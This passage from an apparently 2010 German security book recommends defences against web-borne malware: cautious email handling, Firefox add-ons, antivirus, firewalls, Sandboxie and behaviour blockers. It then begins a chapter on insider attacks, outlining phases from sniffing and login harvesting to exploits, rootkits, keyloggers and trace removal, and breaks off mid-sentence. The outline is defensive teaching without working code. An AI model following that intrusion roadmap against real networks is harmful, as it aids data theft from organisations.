\u00fcber ein P2P-Tool eine Musikdatei mit der Dateiendung exe oder auf einer anr\u00fcchigen Seite den ultimativen Crack f\u00fcr die Umwandlung einer Demo- in die Vollversion herunterl\u00e4dt, dem ist eigentlich nicht mehr zu helfen. Grenzenlose Naivit\u00e4t oder schlichtweg Gier machen solche User zur leichten Beute von Internetgangstern und Abzockern. Wer jetzt mehr \u00fcber Malware und die feinen Unterschiede zwischen Trojanern, Rootkits, Viren und RATs noch n\u00e4her erfahren m\u00f6chte, dem sei mein \u00bbAnti Hackerz Book 2009\u00ab w\u00e4rmstens empfohlen. Ingesamt bleibt festzuhalten, dass die Bedrohung aus dem Internet insgesamt in der Breite w\u00e4chst und die Angriffszenarien teilweise wenigstens einen hohen technologischen Standard aufweisen. Auf der anderen Seite haben wir aber den Eindruck, dass die Gef\u00e4hrlichkeit dieser Malware-Attacken und pr\u00e4parierter Internetseiten mitunter arg \u00fcbersch\u00e4tzt wird. Nach speziell pr\u00e4parierten Webseiten beispielsweise haben wir eher im Stunden- als im Minutenbereich suchen m\u00fcssen. Die Malware-Bauk\u00e4sten sind f\u00fcr Script-Kiddies eine h\u00fcbsche Spielwiese; das Potenzial dieser zusammengeklickten Sch\u00e4dlinge ist f\u00fcr ein ordentlich gepatchtes und abgesichertes Betriebssystem nach unseren Testergebnissen aber nicht sonderlich hoch. Ungleich gef\u00e4hrlicher sind neue, auf bestimmte Anwendergruppen gezielt abgesetzte Sch\u00e4dlinge, Zero Day Exploits, die sich \u2013 gut getarnt durch Rootkits \u2013 hinter dem R\u00fccken der Anwender im System einnisten.\n378\n17.5\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nSchutz vor (un)bekannten Sch\u00e4dlingen aus dem Netz\nWie sch\u00fctzt man sich generell und vor allem wirkungsvoll vor solchen Attacken? Den wichtigsten Schutz \u00fcberhaupt bietet ein Tool, das sich im Repertoire aller Netzanwender befinden sollte: Brain 2.0, der eigene Verstand, denn die gr\u00f6\u00dfte Gefahr f\u00fcr die Computer- und Netzwerksicherheit sitzt meistens vor dem Monitor, der sogenannte \u00bbBioLayer\u00ab. Hier gilt die Maxime: Wenn Du wei\u00dft, was Du tust, kannst Du tun, was Du willst. Ich (PK) spreche hier durchaus aus Erfahrung, denn aus Unachtsamkeit und schierer Neugier h\u00e4tte ich mir mein Heimnetzwerk auch schon einige Male zerschie\u00dfen k\u00f6nnen. Anl\u00e4sse gibt\u2019s genug. Vor wenigen Jahren ereilte mich das Schicksal fast zweimal kurz hintereinander. Beide Male war es schon ziemlich sp\u00e4t (eine Entschuldigung braucht schlie\u00dflich jeder). Es war also gegen 2:00 Uhr morgens und ich checkte gerade meine Mails bei GMX, der im Allgemeinen Mails mit b\u00f6sartigem Code schnell ausfiltert, sodass ich mir auch nicht viel dachte, als ich den Mailanhang anklickte, der mir ein wichtiges Update in Aussicht stellte. Misstrauisch wurde ich erst, als eine kurze Installationsmeldung aufblitzte und dann nichts mehr kam. Mein Misstrauen best\u00e4tigte sich dann schnell. Ich hatte einen Sch\u00e4dling aktiviert \u2013 allerdings befand der sich noch in einem experimentellen Stadium, wo er wenig Schaden anrichtete. Auf jeden Fall war ich wieder hellwach und bestrebt, Schadensbegrenzung zu betreiben. Einige Tage sp\u00e4ter erwischte es mich nach einer offiziellen Softwareinstallation. Ich hatte das Programm, das ich bis dato noch nicht kannte, aus einer relativ unbekannten Shareware-Sammlung heruntergeladen. Stutzig wurde ich in dem Moment, als die Firewall mehrfach Versuche eines Treibers meldete, Kontakt ins Internet herstellen zu wollen. Auch in dem Fall hatte ich mir einen Sch\u00e4dling eingefangen. Ein gesundes Misstrauen privat wie im B\u00fcro ist der Sicherheit meistens zutr\u00e4glich. \u2022\n\u00d6ffnen Sie niemals unbesehen den Mailanhang einer Ihnen unbekannten Quelle.\n\u2022\nPr\u00fcfen Sie die Plausibilit\u00e4t von Absender, Mailinhalt und Anhang: Ergibt alles einen nachvollziehbaren Sinn? Eine E-Mail von Ihrem Chef mit dem Text \u00bbNa, schon gesehen?\u00ab und dem Anhang britney.spears.pdf.exe ist vielleicht nicht das, was es zu sein scheint.\n\u2022\nSicherheitsupdates und Patches werden von Microsoft & Co. im Allgemeinen nicht via E-Mail versandt oder annociert.\n\u2022\nRechnungen werden in aller Regel als PDF-Dokument, nie jedoch als PE-Datei (mit ausf\u00fchrbarem Code) verschickt; insbesondere ist Misstrauen angesagt, wenn Sie mit dem betreffenden Unternehmen in keiner Gesch\u00e4ftsbeziehung stehen.\n\u2022\nMeiden Sie unbekannte Downloadquellen und -archive. Im besten Fall ist die Software mit Adware verseucht; im schlimmsten Fall holen Sie sich einen Trojaner mit Rootkit auf die Platte.\n\u2022\nSex & Porn, ein wundersames Ph\u00e4nomen: Die Branche gl\u00e4nzt mit gigantischen Zuwachsraten, aber offiziell besucht niemand entsprechende Seiten. Bilder und Videos werden selten aus reiner Menschen-/Sinnenfreude verschenkt; auf keinen Fall\n17.5 Schutz vor (un)bekannten Sch\u00e4dlingen aus dem Netz\n379\nbraucht man aber spezielle Zugangssoftware, Player oder Codecs, um diesen Schmuddelkram goutieren zu k\u00f6nnen. \u2022\nWarez: Wenn Sie Software nicht bezahlen k\u00f6nnen oder wollen, brauchen Sie sie meist auch nicht wirklich. Es ist im \u00dcbrigen kein Widerspruch in sich: Es gibt seri\u00f6se Warez-Quellen, aber verschenkt wird in den seltensten F\u00e4llen etwas. Dass Sie mit Werbung zugem\u00fcllt werden, ist oft nur das geringste Problem. Ein Tipp: Greifen Sie alternativ zu Open-Source-Programmen!\nWie so oft sind es die einfachen Regeln, \u00fcber die selbst erfahrene Internet-User stolpern. Was wir oben \u00fcber Mailanh\u00e4nge und Downloads gesagt haben, gilt auch f\u00fcrs Surfen. Man sollte sich bewusst sein, dass das eigene, risikoreiche Verhalten die meisten Malware-Attacken beg\u00fcnstigt. Wer berufsm\u00e4\u00dfig nach neuesten Rootkits und Trojanerbauk\u00e4sten das Internet absucht, chinesischen und russischen Hackerseiten seine Referenz nicht versagt, muss anders vorgehen und besser ausger\u00fcstet sein als jemand, der via Internet seinen Interessen als Brieftaubenz\u00fcchter fr\u00f6nt. Zu sicher sollte man sich in diesem Fall allerdings auch nicht f\u00fchlen. Nicht selten verbergen sich Drive-by-Downloads auch auf den vorderen Pl\u00e4tzen bei einer Google-Suche. Webseiten werden des \u00d6fteren gehackt, und nicht immer verewigen sich die Angreifer nur mit ihrem Logo. Die b\u00f6sartigere Variante ist die, dort Malware-Links bzw. MalwareCode zu platzieren. Manchmal braucht man noch nicht einmal die Seite zu hacken. Es reicht, in Wikipedia einen Artikel mit einem Malware-Link zu versehen und Leser genau darauf anzusetzen. So geschehen im November 2006: Findige Hacker mit einem ausgepr\u00e4gten Hang f\u00fcr Ironie manipulierten dabei die Seite mit Informationen zum Wurm W32.Blaster. Es wurde darin vor einer neuen Version des Wurms Lovesan/MS Blaster gewarnt und auch gleich ein Verweis auf einen angeblichen Fix eingebaut. Wer sich sch\u00fctzen wollte, tappte in genau diese Falle. \u00c4hnlich beliebt ist es, in Diskussionsforen Links zu interessanten Webseiten oder Downloads einzustreuen. Zwar werden diese schon nach kurzer Zeit enttarnt, aber einige unachtsame Surfer hat es dann bereits erwischt. Noch ein gutes St\u00fcck gemeiner sind die Tricks der Script-Kiddies, ahnungslose Opfer dadurch in die Falle zu locken, dass man via Chat-Tools, Live Messengers, VoiP-Tools etc. einen pers\u00f6nlichen Kontakt zum Opfer aufbaut und ihm dann den Sch\u00e4dling unter die Weste jubelt. Der gr\u00f6\u00dfte Vorteil dieser Variante: Man kann vorher das Opfer aushorchen, um dann konkret und gezielt die Sicherheitsl\u00fccken auszunutzen. Das ganze Ausma\u00df dieses Elends wird dann in den Foren des www.trojaner-board.de oder auch www.hijackthis-forum.de deutlich.\n17.5.1 Mailprogramm und Webbrowser absichern Zwar gilt: A fool with a tool is still a fool (auf gut Deutsch: ein Klempnerkasten macht aus einem Idioten noch keinen Klempner). Nichtsdestotrotz gibt es eine ganze Reihe von n\u00fctzlichen Sicherheitswerkzeugen zur Unterst\u00fctzung von Brain 2.0. Fangen wir bei den einfachsten M\u00f6glichkeiten an. Outlook und der Internet Explorer 8.0 bieten heute Sicherheitsfeatures, die vor einigen Jahren kaum vorstellbar schienen \u2013 f\u00fcr MicrosoftVerh\u00e4ltnisse. Genau das ist aber die Crux. Durch ihre enge \u2013 komfort- wie systembedingte \u2013 Integration in die Betriebssysteme desselben Herstellers sind sie von Grund auf anf\u00e4lliger gegen\u00fcber Malware-Attacken als andere Produkte. Viele, wenn nicht die\n380\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nmeisten Sicherheitsexperten raten deshalb zu Alternativen von Drittanbietern. Wir k\u00f6nnen uns dem Urteil nur anschlie\u00dfen. Unter Sicherheitsaspekten sind Mozilla Firefox und Opera die bessere Wahl \u2013 aber nat\u00fcrlich auch nur dann, wenn die Update-Zyklen konsequent eingehalten werden. Machen Sie den Test. Suchen Sie in Google einmal nach \u00bbSicherheitsl\u00fccken Opera\u00ab (254.000 Treffer) und das andere Mal nach \u00bbSicherheitsl\u00fccken Internet Explorer\u00ab (816.000 Treffer). Sie werden \u00fcberrascht sein. Zwar verzeichnet der Mozilla Firefox auch viele Eintr\u00e4ge, was aber eher dem gegenteiligen Effekt geschuldet ist. Wie keine andere Browsertechnologie vor ihm ist er modular aufgebaut und mit definierten Erweiterungsschnittstellen verstehen. W\u00e4hrend der Internet Explorer erst seit der vorletzten Version einen Filter gegen Phishing-Seiten bereith\u00e4lt, gibt\u2019s das bei Firefox schon l\u00e4nger. Zudem hat der Anwender hier die Wahl, zu welchem Plugin er greifen m\u00f6chte. Beispielsweise gibt es heute (Stand 1.3.2010) 615 (im Vergleich zu 154 am 27.2.2007) Firefox-Add-Ons zum Thema \u00bbDatenschutz & Sicherheit\u00ab. Eine pers\u00f6nliche Empfehlung m\u00f6chten wir f\u00fcr folgende Add-Ons aussprechen: \u2022\nWOT \u00abWeb of Trust sch\u00fctzt Sie beim Browsen und Shoppen im Internet. Die farblich codierten Symbole helfen Ihnen, Online-Betrug aus dem Weg zu gehen und Betr\u00fcgereien, unzuverl\u00e4ssige Shopping Sites und Sicherheitsrisiken bereits im Vorfeld zu erkennen.\u00ab\n\u2022\nKeyScrambler Personal Verhindert den schlimmsten Alptraum: einen unenttarnten Keylogger, der alle WebLogins aufzeichnet. Zu diesem Zweck installiert das Tool einen Kerneltreiber, der alle Logindaten beim Eintippen verschl\u00fcsselt, sodass Keylogger keine Chance haben, an die Daten heranzukommen.\n\u2022\nNoScript Erlaubt Ihnen mit einem Mausklick, mobilen Code standardm\u00e4\u00dfig f\u00fcr unbekannte Webseiten zu deaktivieren bzw. ihn f\u00fcr Seiten Ihres Vertrauens zuzulassen.\n\u2022\nWhois Sehr n\u00fctzlich, wenn Sie an der Herkunft der aktuellen Seite Zweifel haben und gerne wissen m\u00f6chten, wem sie geh\u00f6rt bzw. wer sie wo registriert hat.\n\u2022\nTorbutton 1.2.4 In Kombination mit dem verschl\u00fcsselten Tor-Netzwerk kann zwischen anonymem und klassischem Websurfen umgeschaltet werden.\n\u2022\nCsFire 0.2 Sch\u00fctzt vor Cross Site Attacks beziehungsweise Cross Domain Traffic, wo der Anwender unbemerkt von einer bekannten Webseite auf eine \u00e4hnlich aussehende, aber Schadcode enthaltende Seite gelotst wird.\nAls Alternative zu Outlook Express empfiehlt sich der ebenfalls von Mozilla.org kommende Mozilla Thunderbird. Das Mailprogramm bietet zwar etwas weniger Komfort als sein Konkurrent, kann aber mit etlichen Sicherheitsfeatures aufwarten, die diesen E-MailClient weniger angreifbar machen.\n17.5 Schutz vor (un)bekannten Sch\u00e4dlingen aus dem Netz\n381\nMit diesen Hilfsmitteln kann man die Gefahr reduzieren, dass Sch\u00e4dlinge durch noch unbekannte Systeml\u00fccken schl\u00fcpfen und sich auf dem Rechner breitmachen. Zudem reduziert man damit deutlich die Angriffsfl\u00e4che, da Microsoft nun mal Hackers Lieblingsfeind Nr. 1 ist und die Systemarchitektur von Windows NT-Versionen nicht unbedingt im Hinblick auf Sicherheit optimiert wurde. Windows 7 steht auf einem anderen Blatt, und wir werden uns zu gegebener Zeit damit ausf\u00fchrlicher auseinandersetzen.\n17.5.2 Pflicht: Malware- und Antivirenscanner Ins Pflichtarsenal einer wirkungsvollen Netzprophylaxe geh\u00f6ren aber noch weitere Tools: an vorderster Stelle die klassischen Malware-/Antivirenscanner, insbesondere solche, die \u00fcber wirkungsvolle Realtime-Module verf\u00fcgen, mit denen Sicherheit und Unbedenklichkeit von E-Mails, besuchten Webseiten und Downloads \u00fcberwacht werden k\u00f6nnen. Welches man nimmt, ist in gewissen Grenzen Geschmackssache. Auf dem Markt gibt es gute, f\u00fcr den Privatgebrauch kostenlose Tools wie Antivir Personal, AVG Free oder die Bitdefender Free Edition, aber auch leistungsf\u00e4hige professionelle Produkte wie Nod32.\nBild 17.38: Freeware AV-Scanner mit Realtime-Schutz\nAls au\u00dferordentlich wirkungsvoll in unseren Malwaretests erwies sich ferner die Profivariante von Zonelabs: Zonealarm Pro. Zwar hat der Ulmer CCC vor einigen Jahren die Diskussion losgetreten, in der rundweg bestritten wurde, dass Firewalls die Sicherheit\n382\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nvon privaten Internetanwendern grunds\u00e4tzlich erh\u00f6hen k\u00f6nnten190, und gab damit den Herstellern indirekt auch die Chance, ihre Produkte zu verbessern. Andererseits unterminierte diese Diskussion aber das Bem\u00fchen vieler Sicherheitsexperten, die User vom Sinn eines erh\u00f6hten Rundumschutzes zu \u00fcberzeugen. Wer als Netzwerklaie von Experten h\u00f6rt, dass Firewalls bei der Abwehr von Internetangriffen \u00bbprinzipiell versagen\u00ab (als Beleg werden dann einige Proof-of-ConceptStudien vorgelegt), wird dann nicht mehr geneigt sein, sich mit dem Thema Personal Firewall auseinanderzusetzen. Besonders \u00e4rgerlich ist es dann, wenn solche Seiten mehrere Jahre sp\u00e4ter immer noch weitgehend unkommentiert und unaktualisiert im Netz sind191. Nicht, dass man uns missversteht: Grunds\u00e4tzlich war und ist diese Diskussion sinnvoll. Es ist auch nicht zu bestreiten, dass die Marketingstrategen Securityprodukte und deren Features hochjubelten und dem Anwender damit ein tr\u00fcgerisches Gef\u00fchl von Sicherheit vermittelten. Je komplexer die Personal- oder Desktop-Firewalls werden, desto mehr Schutz bieten sie \u2013 mitunter allerdings nur dem kompetenten Anwender. Beispielsweise z\u00e4hlt Zonealarm Pro zu den innovativsten und technologisch fortgeschrittensten Firewalls auf dem Markt. Durch die eingesetzte Kerneltechnologie werden viele Sch\u00e4dlinge, selbst Rootkits, darin gehindert, Systemmodifikationen ungefragt vorzunehmen. Allerdings sind der Anwender und seine Kompetenz auch st\u00e4rker gefordert. Wenn die Firewall nachfragt, ob das modifizierte Programm X (wieder) ins Internet darf, sollte man nicht blind den Best\u00e4tigungsknopf dr\u00fccken. Gleiches gilt, wenn Zonealarm beim Anwender nachfragt, ob sich beim Start eines neuen Programms der Treiber XYZ im System verewigen darf. Ohne fundierte Systemkenntnisse wird Otto Normalanwender nur genervt sein und immer wieder den Yes-Button dr\u00fccken. Soweit also kann man den Vertretern des Chaos Computer Clubs Recht geben. An anderer Stelle wird freilich recht dick aufgetragen, z. B. mit Vorstellung der breakoutwp.exe, einem Proof-of-Concept, das in der Tat durch keine am Markt befindliche Firewall zu blockieren ist. Zwar erkennt Zonealarm einen Sch\u00e4dling und bietet an, ihn zu killen. Kommt man der Aufforderung jedoch nicht nach, schaltet das Tool ungefragt und ungehindert eine Verbindung ins Internet und l\u00e4dt aus dem Internet ein neues Wallpaper auf den Rechner. Zugegebenerma\u00dfen ein verbl\u00fcffender Gag. Der praktische N\u00e4hrwert dieses Tricks ist allerdings beschr\u00e4nkt. Man braucht jetzt auch nicht gro\u00dfartig an seiner Firewall zu drehen und zu schrauben (u. a. deswegen, weil es nicht funktioniert); alles, was man stattdessen braucht, um diese Verbindung zu blockieren, ist ein simpler Eintrag in die Registry. Unter HKEY_CURRENT_USER/Software/Microsoft/ Windows/currentVersion/Policies/Explorer wird ein neuer DWORD-Key angelegt (falls nicht vorhanden) und als Hex-Wert die Zahl 1 eingetragen. Damit ist der Active Desktop, dessen Internetfunktionalit\u00e4t das Exploit nutzt, abgeschaltet. Die unter http://ulm.ccc.de/PersonalFirewalls/Alternativen aufgef\u00fchrten Alternativen sind dann aber recht lapidar. Der beste Tipp ist noch der Einsatz eines \u00bbfilternden Routers\u00ab, da dieser den einfachen Zugriff eines Remote Adminstration Tools erst mal blockt. Die IP-Adresse, unter der man f\u00fcr andere im Netz sichtbar ist, ist die des Routers, nicht die 190\nvgl. http://ulm.ccc.de/PersonalFirewalls\n191\nvgl. http://blog.copton.net/articles/pfw-versagen/\n17.5 Schutz vor (un)bekannten Sch\u00e4dlingen aus dem Netz\n383\nIhres Internet-PCs. Folglich landen potenzielle Angreifer erst im Router und nicht sofort auf Ihrem Rechner.\nBild 17.39: Active Desktop blockieren\nDie entsprechende Funktion hei\u00dft Network Address Translation (NAT); zusammen mit anderen Sicherheitsfeatures wie der Stateful Packet Inspection, bei der alle Datenpakete verworfen werden, die der User nicht explizit anfordert, hat hier der Netzwerkanwender tats\u00e4chlich mehr Sicherheitsressourcen als mit dem singul\u00e4ren Einsatz einer DesktopFirewall. Sollte der Netzwerkrechner dennoch mal unter Beschuss stehen, reicht es, den Stecker zu ziehen. Nachdem der Router wieder im Netz ist, bekommt er vom ISP eine neue IP-Adresse zugewiesen. Einfacher gestrickte RATs ohne Reverse-ConnectionFunktionalit\u00e4t werden damit wirkungsvoll ausgetrickst. Die IP-Adresse, die sie dem Angreifer via E-Mail weitermelden, ist die des lokalen Rechners, womit ein Verbindungsversuch von au\u00dfen nat\u00fcrlich nicht zustande kommt. Als Alternativen zu einer Personal-Firewall nennt der Experte weiterhin ein Programm, um \u00fcberfl\u00fcssige Dienste abzuschalten (f\u00fcr Einzelplatz-PCs), einen Virenscanner und unter Vorbehalt TCP/IP-Tools, um ein- und ausgehende Netzwerkverbindungen \u00fcberwachen zu k\u00f6nnen. Gegen diese Empfehlungen ist nichts einzuwenden \u2013 au\u00dfer, dass sie eine gut konfigurierte und gemanagte Firewall nicht ersetzen, sondern h\u00f6chstens erg\u00e4nzen k\u00f6nnen. Im \u00dcbrigen ist der hier schon vorgestellte Port Explorer besser als der CCC-seitig empfohlene Port Reporter von Microsoft, da er mehr und gezieltere Informationen zur Verf\u00fcgung stellt, insbesondere aber auch den Datenverkehr versteckter Sockets protokolliert. Sehr hilfreich zur Abwehr von Malware-Attacken aus dem Internet sind zwei weitere Tools.\n384\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\n17.5.3 Malware-Abwehr mit Sandboxie Sandboxie erhalten Sie unter www.sandboxie.com; sollten Sie es nach 30 Tagen dauerhaft und ohne Werbeeinblendung nutzen wollen, werden 25 US-Dollar f\u00e4llig. Wie der Name es andeutet, arbeitet das Tool als Sandbox, d. h. als experimentelles, in sich abgeschottetes Testfeld f\u00fcr Programme. Der Hauptzweck dieser Software besteht darin, kritische oder als kritisch eingestufte Programme davon abzuhalten, sich dauerhaft im System zu verewigen. Im Gegensatz etwa zu VMware, mit dem sich auf der x86-Prozessor-Plattform mehrere Maschinen mit verschiedenen Betriebssystemen gleichzeitig virtualisieren lassen, arbeitet Sandboxie etwas einfacher und ist nat\u00fcrlich auch viel einfacher zu installieren.\nBild 17.40: Prinzip einer Sandbox\nWas Sandboxie macht, l\u00e4sst sich gut an oben stehender Grafik verdeutlichen. Im Normalfall, also ohne aktiviertes Sandboxie, werden Programme im Speicher ausgef\u00fchrt und die zugeh\u00f6rigen Dateioperationen (Lesen, Schreiben) direkt auf der Platte abgewickelt. L\u00e4sst man nun ein Programm, beispielsweise einen Webbrowser, in einer Sandbox laufen, passiert Folgendes: Das Programm wird \u00fcber den Sandbox-Treiber gestartet, der fortan auch die gesamten Lese-Schreib-Operationen in einer virtuellen Umgebung steuert. Betrachten wir das an einem praktischen Beispiel. Nach der Installation findet sich die Sandboxie Control in der Trayleiste. Wir \u00f6ffnen das Programm, w\u00e4hlen im Men\u00fc Function die Funktion Run Sandboxed und entscheiden dann, ob wir unseren Default-Browser in den Sandkasten stecken oder irgendein beliebiges Programm daf\u00fcr ausw\u00e4hlen.\n17.5 Schutz vor (un)bekannten Sch\u00e4dlingen aus dem Netz\n385\nBild 17.41: Einfache Bedienung von Sandboxie\nBild 17.42: Opera in der Sandbox\nDanach l\u00e4uft Opera im Sandkasten. Alle Operationen des Browsers, das Ablegen von Lesezeichen, das Speichern von Cookies und anderen tempor\u00e4ren Dateien wird nicht auf die Platte geschrieben, sondern in einem gesch\u00fctzten Bereich abgelegt, auf den man mit der Funktion Contents of Sandbox / Explore Contents mit dem normalen Dateiexplorer zugreifen kann.\nBild 17.43: Den Inhalt der Sandbox unter die Lupe nehmen\nDer praktische Vorteil liegt nat\u00fcrlich auf der Hand. Ger\u00e4t der unvorsichtige User auf eine verseuchte oder sonstwie manipulierte Webseite, wird der Schadcode nicht real, sondern virtuell \u2013 in der Sandbox \u2013 ausgef\u00fchrt, einschlie\u00dflich aller Schreiboperationen in der (simulierten) Registry. L\u00f6scht man jetzt den Sandbox-Prozess, werden alle zuvor nicht vom virtuellen Verzeichnis gesicherten bzw. kopierten Dateien gel\u00f6scht. Der zweite Vorteil liegt im Testen von unbekannten oder kritischen Programmen, die man z. B. via E-Mail oder Download auf der Festplatte gespeichert hat. Statt diese jetzt auf eigenes Risiko im Dateiexplorer anzuklicken, l\u00e4sst man sie bequem \u00fcber Sandboxie laufen, wo man in aller Ruhe studieren kann, welche Ver\u00e4nderungen dieses Programm (im virtuellen Verzeichnis) vorgenommen hat. Das Verfahren ist relativ narrensicher; man muss nur darauf achten, dass der dem Sandboxie zugewiesene Speicherplatz ausreichend dimensioniert ist. Ansonsten reagiert auch Outlook allergisch, wenn ihm virtualisierte Dateien untergeschoben werden; hier kann man dann die Sandboxie-Optionen entsprechend anpassen.\n386\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\nEin Anwender berichtet dazu aus der Praxis:\nBild 17.44: Sandboxie im rauhen Malware-Alltag\n17.5.4 Allzweckwaffe Behavior Blocker & HIPS W\u00e4hrend die meisten AV-Scanner signaturbasiert arbeiten und bekannte Sch\u00e4dlinge auch gut aufsp\u00fcren k\u00f6nnen, arbeiten Behaviour Blocker und Host Intrusion and Prevention Systems nach einem anderen Prinzip. Sie \u00bbbeobachten\u00ab die gestarteten Programme nach einem definierten Regelset: Zeigen diese ein auff\u00e4lliges Verhalten, beispielsweise Kernelaktivit\u00e4ten oder Querzugriffe auf andere Programmressourcen, werden sie blockiert. Vielfach werden die Ausdr\u00fccke Behavior Blocker und HIPS (Host-based Intrusion and Prevention System) synonym verwendet. Streng genommen ist das aber nicht korrekt: Ein Behavior Blocker verf\u00fcgt h\u00e4ufig \u00fcber vordefinierte Regeln, welche Prozesse sch\u00e4dlich und in der Folge zu unterbinden sind, w\u00e4hrend ein HIPS nur Systemauff\u00e4lligkeiten meldet und die Entscheidung Blockieren oder Zulassen dem Anwender \u00fcberl\u00e4sst. In der Praxis verschwimmen diese Unterschiede allerdings oft. Da viele Anbieter klassischer AV-Scanner mittlerweile die entsprechende Funktionalit\u00e4t nachger\u00fcstet haben, stehen momentan nur wenig aktuelle Standalone-Tools zur Erg\u00e4nzung bereit. Zu nennen w\u00e4ren insbesondere zwei Produkte: das kostenlose Threatfire192 und das sehr gut getestete Mamutu193.\n192\nhttp://www.threatfire.com\n193\nhttp://www.emsisoft.de/de/software/mamutu\n17.5 Schutz vor (un)bekannten Sch\u00e4dlingen aus dem Netz\n387\nBild 17.45: W\u00e4chter im Hintergrund: Threatfire\nStellt Threatfire fest, dass der PC von einer ihm bekannten Bedrohung befallen ist, wird der Malwareprozess sofort beendet und das entsprechende Programm dauerhaft gel\u00f6scht; machen Programme durch ungew\u00f6hnliche Aktivit\u00e4ten auf sich aufmerksam, gibt Threatfire eine Warnmeldung ab und blockiert den Sch\u00e4dling.\nBild 17.46: Der Sicherheitsstatus wird in Echtzeit zur\u00fcckgemeldet\nWer unsicher ist, klickt auf Weitere Informationen und l\u00e4sst sich die Dateien und Registrierungseintr\u00e4ge des inkriminierten Programms oder Dienstes anzeigen und entscheidet dann \u00fcber die Sperrung oder Freigabe der (un-)erw\u00fcnschten Anwendung. Zus\u00e4tzlich gibt es die M\u00f6glichkeit, die Community Protection zu aktivieren. In diesem Fall werden Informationen zu neu entdeckter Malware an die Programmentwickler weitergeleitet, die sie dann gegebenenfalls anderen Usern zur Verf\u00fcgung stellen. Im\n388\nKapitel 17 \u2013 Szenario VI: Malware-Attacke aus dem Internet\npraktischen Test hinterlie\u00df das Produkt einen zwiesp\u00e4ltigen Eindruck. In einem unserer Testsysteme waren zwei sich erg\u00e4nzende Freeware-AV-Scanner integriert. Nach der Installation war das gesamte System eingefroren und lie\u00df sich zu keiner weiteren Zusammenarbeit bewegen. Nur durch diverse Tricks gelang es, Threatfire wieder loszuwerden, ohne das komplette System zu reorganisieren. Auf der anderen Seite gl\u00e4nzt das Programm mit einer Reihe interessanter Features und einem kostenlosen Support. Im Gegensatz zu Threatfire kommt Mamutu ohne Scanfunktion aus (die von den meisten AV-Scannern auch zuverl\u00e4ssiger erledigt wird).\nBild 17.47: Die Schaltzentrale von Mamutu\nMamutu l\u00e4sst sich auch feiner konfigurieren, zum Beispiel um Fehlalarme zu vermeiden.\n17.5 Schutz vor (un)bekannten Sch\u00e4dlingen aus dem Netz\n389\nBild 17.48: Feintunung Malware IDS\nBlockiert werden k\u00f6nnen sowohl Malware-typische Programme und Dienste (Spyware, Backdoor, Rootkits, Keylogger, W\u00fcrmer) als auch Code, der sich in andere Prozesse einschleust, Systemdateien modifiziert oder sich in die Autostartdatei eintr\u00e4gt. Einziger Wermutstropfen: Das Programm kostet 20 \u20ac. Da heute (Stand 2010) selbst die meisten Freeware Security-Scanner (beispielsweise AntiVir oder Avast) mit einem Realtime-Schutz ausgestattet sind und auch DesktopFirewalls mit HIPS-Funktionalit\u00e4ten gl\u00e4nzen, kann in vielen F\u00e4llen auf die zus\u00e4tzliche Absicherung mit einem Standalone-Behaviour-Blocker verzichtet werden. Au\u00dferdem ist zu bedenken, dass der doppelte Einsatz von Programmen mit HIPS-Funktionalit\u00e4t das System verlangsamen, wenn nicht gar (im Einzelfall) blockieren kann.\n391\n18 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt Ausgangsszenario: Einige Male hat sich der Leiter Forschung & Entwicklung schon gewundert: Wichtige Firmeninterna und Neuentwicklungen sind trotz aktiver Sicherheitsma\u00dfnahmen anscheinend bei einem Wettbewerber gelandet. Jedenfalls gibt es kaum eine andere Erkl\u00e4rung f\u00fcr den Umstand, dass dieser fast zeitgleich mit absolut \u00e4hnlichen Produkten auf den Markt kam. Irgendwo muss es also eine undichte Stelle oder, im Fachjargon, einen \u00bbMaulwurf\u00ab in der Abteilung geben. Nicht ganz auszuschlie\u00dfen ist allerdings auch die M\u00f6glichkeit, dass ein externer Angreifer einen Weg gefunden hat, vertrauliche Informationen aus dem Firmennetz abzugreifen.\n18.1\nDer Feind im eigenen Netzwerk\nDas folgende Kapitel beschreibt Szenarien, in denen sich der Feind bzw. der kriminelle Hacker nicht mehr von au\u00dfen Zugang zu Firmennetzen verschaffen muss, sondern seine Aktivit\u00e4ten innerhalb des Netzes entfaltet. Der gesamte Angriffsverlauf wird anhand der aufeinander aufbauenden Teilbereiche Sniffing, Scanning und Exploiting verdeutlicht. Im Anschluss daran gehen wir n\u00e4her auf die zahlreichen M\u00f6glichkeiten ein, die sich dem neuen Inhaber der unwissend ausgeliehenen Rechner bieten. Der Fahrplan setzt sich wie folgt zusammen: \u2022\nSniffing: Network Mapping, Mitlesen der Netzwerkdaten, Sammeln von Informationen\n\u2022\nScanning: Kontaktaufnahme zu Rechnern, Zuordnung von Betriebssystemen und Diensten, Suche nach Verwundbarkeiten\n\u2022\nExploits: Einsatz von Schadsoftware, um unzul\u00e4ssigerweise an Rechte zu gelangen\n\u2022\nVerwanzung/Zweckentfremdung: Einbindung von Rootkits, Entfernung m\u00f6glicherweise kompromittierender Spuren, Einbindung von Schadprogrammen wie z. B. Keyloggern, Password-Crackern und \u00c4hnlichem\nBeim Sniffing geht es in erster Linie darum, Informationen einzuholen: Dazu geh\u00f6rt das Mapping des Netzwerks, die intensive Betrachtung des Datenverkehrs und oftmals damit einhergehend die Gewinnung von Login-Daten. Diese Form der Observation verl\u00e4uft passiv, der Angreifer hinterl\u00e4sst somit so gut wie keine erkennbaren Spuren.\n392\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nDas Scanning dient dazu, Informationen \u00fcber die im Netzwerk befindlichen Rechner und die darauf zur Verf\u00fcgung gestellten Dienste zusammenzutragen. So erf\u00e4hrt ein Angreifer beispielsweise, welche Betriebssysteme im Einsatz sind und welche Rechner Web- oder Dateidienste anbieten. Hier besteht die Gefahr, dass ein Angreifer verwundbare Dienste erkennt und sp\u00e4ter gezielt ausnutzt. Beim Exploiting kommen Schadprogramme zum Einsatz, die Schw\u00e4chen in Diensten ausnutzen. Ziel der Exploits ist es, an Privilegien des Fremdsystems zu gelangen. Hierbei werden verwundbare Dienste gezielt missbraucht, um sich beispielsweise Root-Rechte anzueignen. Die aus den Bereichen Sniffing und Scanning gewonnenen Informationen werden f\u00fcr den Einsatz von Exploits aufbereitet und dienen der Vorbereitung des Angriffs. Im letzten Schritt erfolgt die Verwanzung und Zweckentfremdung des Rechners: Mit 